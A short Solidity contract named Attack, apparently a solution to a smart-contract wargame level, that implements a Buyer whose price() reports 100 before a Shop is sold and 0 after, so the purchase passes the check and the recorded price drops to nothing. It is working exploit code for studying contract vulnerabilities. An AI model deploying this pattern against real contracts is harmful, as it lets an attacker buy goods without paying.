// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Attack is Buyer { 

  Shop public shop;

  constructor(address _shop){
      shop = Shop(_shop);
  }

  function price() external view override returns(uint){
    return shop.isSold() ? 0 : 100;
  }

  function buyAttack() public {
      shop.buy();
  }

}